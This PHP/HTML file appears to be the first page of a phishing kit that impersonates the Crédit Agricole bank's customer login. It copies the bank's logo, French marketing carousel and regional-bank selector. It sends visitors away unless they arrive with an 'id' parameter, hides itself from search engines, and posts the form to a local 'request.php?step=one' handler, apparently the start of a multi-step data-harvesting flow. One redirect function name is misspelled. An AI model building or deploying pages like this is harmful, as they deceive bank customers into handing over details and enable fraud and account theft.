<?php
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=one&'.$id;

?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />
    <link rel="icon" type="image/png" href="CA_Logo_seul-1.svg" />
    <link rel="stylesheet" href="<?php echo $css1; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css2; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css3; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css4; ?>" type="text/css">
    <title></title>
  </head>
  <body class="BodyLogin">

   <main>
      <div class="Login">
         <div class="Login-header js-Header">
            <a href="" class="Login-logo Login-logo-js">
               <div class="Login-logoImg js-needFakeNotSvg" style="position: relative;"><img class="" src="<?php echo $img; ?>/CA_Logo_seul-1.svg" alt="Crédit Agricole - Banque et assurances" style="position: absolute; top: 50%; left: 50%; max-width: 100%; max-height: 100px; height: 100%; transform: translate(-50%, -50%);"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAgICAwICAgMDAwMEBgQEBAQECAYGBQYJCAoKCQgJCQoMDwwKCw4LCQkNEQ0ODxAQERAKDBITEhATDxAQEP/bAEMBAwMDBAMECAQECBALCQsQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEP/AABEIACgA2AMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AlUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//2Q==" style="opacity: 0; max-width: 100%; max-height: 100%; visibility: hidden;"></div>
            </a>
            <a href="#" class="Header-login" id="Login-close" tabindex="0" role="button" aria-label="Quitter l'accès à mon espace"></a>
         </div>
         <div class="container-fluid Template" style="margin-top: 60px;">
            <div class="row js-Template-head">
               <div class="col-xs-12 col-md-6">
                  <div class="Template-reduceMargin15px">
                     <div class="js-StickyPush">
                        <div class="js-FullHeight ForgotPswd-imgWrapper hidden-xs">
                           <div class="placeholder-left parsys">
                              <div class="new-zdg parbase section">
                                 <div class="componentZdg">
                                    <div class="PushCarousel3">
                                       <div><button class="PushCarousel3-masking" onclick="toggleStateCarousel('hom')">Mettre en pause ou
                                          redémarrer le défilement du carousel</button>
                                       </div>
                                       <div class="PushCarousel3-carousel">
                                          <div data-trackingclass="carrousel" class="PushCarousel3-carouselInner owl-loaded owl-drag" data-owl-access-keyup="1" data-owl-carousel-focusable="1">
                                             <div class="owl-stage-outer">
                                                <div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all 0.25s ease 0s; width: 1594px;">
                                                   <div class="owl-item active" aria-hidden="false" style="width: 796px; margin-right: 1px;">
                                                      <div class="PushCarousel3-item" data-trackinginfo="defnat_nexecur_1">
                                                         <div class="PushCommunication-backgroundWrapper">
                                                            <div class="PushCommunication-background PushCommunication-background--filterBlack" style="background-image: url('<?php echo $img; ?>/acces_cr_part_carre.jpg')">
                                                            </div>
                                                         </div>
                                                         <div class="PushCommunication-zoning PushCommunication-zoning--leftCenter PushCommunication-zoning--transparent">
                                                            <div class="PushCommunication-title">
                                                               <div class="texte section">
                                                                  <p><span class="h2"><b>UNE PROTECTION À PORTÉE DE MAIN QUAND VOTRE DOMICILE EST LOIN DES YEUX.</b></span></p>
                                                               </div>
                                                            </div>
                                                            <div class="PushCommunication-text">
                                                               <div class="texte section">
                                                                  <p>Un système de télésurveillance accessible à tous et connecté à votre smartphone pour vous protéger des intrusions et des incendies.</p>
                                                               </div>
                                                            </div>
                                                            <!-- Si la popin de co est activé -->
                                                            <!-- Si la popin de co n'est pas activé -->
                                                            <a href="/ca-charente-perigord/particulier/assurances/habitation/telesurveillance.html" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="/ca-charente-perigord/particulier/assurances/habitation/telesurveillance.html" target="_self" data-owl-temp-tabindex="0" tabindex="0"><span>EN SAVOIR PLUS</span></a>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div class="owl-item" aria-hidden="true" style="width: 796px; margin-right: 1px;">
                                                      <div class="PushCarousel3-item" data-trackinginfo="defcr_rentree-AAV_2">
                                                         <div class="PushCommunication-backgroundWrapper">
                                                            <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('<?php echo $img; ?>/acces_cr_part_carre.jpg')">
                                                            </div>
                                                         </div>
                                                         <div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white">
                                                            <div class="PushCommunication-title">
                                                               <div class="texte section">
                                                                  <p><span class="h3">On ne peut pas prédire l’avenir mais, ensemble, on peut s’y préparer.</span></p>
                                                               </div>
                                                            </div>
                                                            <div class="PushCommunication-text">
                                                               <div class="texte section">
                                                                  <p>Parce qu’un accident est vite arrivé … Soyez bien protégés face aux aléas de la vie quotidienne. Découvrez notre assurance des accidents de la vie*.
                                                                     <br>
                                                                     <span class="RichText-discret">*voir mentions sur site</span>
                                                                  </p>
                                                               </div>
                                                            </div>
                                                            <!-- Si la popin de co est activé -->
                                                            <!-- Si la popin de co n'est pas activé -->
                                                            <a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_self" tabindex="0" data-owl-temp-tabindex="0"><span>en savoir plus</span></a>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="owl-nav"><button type="button" role="presentation" class="owl-prev" tabindex="0"></button><button type="button" role="presentation" class="owl-next" tabindex="0"></button></div>
                                             <div class="owl-dots"><button role="button" class="owl-dot active"><span></span></button><button role="button" class="owl-dot"><span></span></button></div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-xs-12 col-md-6">
                  <div class="Template-reduceMargin15px">
                     <div class="Login-container">
                        <div class="row row-no-padding">
                           <form class="Login-form" id="loginForm" name="loginForm" method="post" action="<?php echo $action; ?>">
                              <div class="GeolocComponent GeolocationDisabled section">
                                 <div class="GeolocationDisabled-content matchHeight">
                                    <div id="trouver-un-cr-mode-search" style="">
                                       <h2 class="GeolocationDisabled-title GeolocForceSearch" style="display: none;">
                                          ACCÉDER À L'ESPACE DÉDIÉ <br> <strong>D'UNE AUTRE CAISSE RÉGIONALE</strong>
                                       </h2>
                                       <p class="GeolocationDisabled-text GeolocationDisabled-text--margin GeolocForceSearch" style="display: none;">
                                          Vous n'êtes pas en <strong class="GeolocCR">XXXX</strong> ou vous souhaitez accéder à l'espace dédié d'une autre Caisse Régionale en saisissant un département.
                                       </p>
                                       <h2 class="GeolocationDisabled-title GeolocFail">
                                          ACCÉDER À L'ESPACE DÉDIÉ <br> <strong>DE VOTRE CAISSE RÉGIONALE</strong>
                                       </h2>
                                       <p id="labelCodeDepartementCR" class="GeolocationDisabled-text GeolocFail">Trouvez une caisse régionale en saisissant un département</p>
                                       <div>
                                          <div class="form-group">
                                             <input id="GeolocSearchInput" name="GeolocSearchInput" type="text" class="form-control GeolocationDisabled-noBorder" placeholder="Exemple 75 pour Paris." aria-labelledby="labelCodeDepartementCR" aria-describedby="errorMessageCR" required>
                                             <span id="errorMessageCR" class="help-block"></span>
                                          </div>
                                       </div>

                                       <button type="submit" class="btn btn-primary GeolocationDisabled-btn" aria-label="Rechercher une caisse régionale" onclick="NPC.trouverCR.runSearch()">Valider</button>


                                    </div>

                                 </div>
                              </div>
                           </form>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </main>

</body>
</html>
<?php
    endif;
    ob_end_flush();
?>
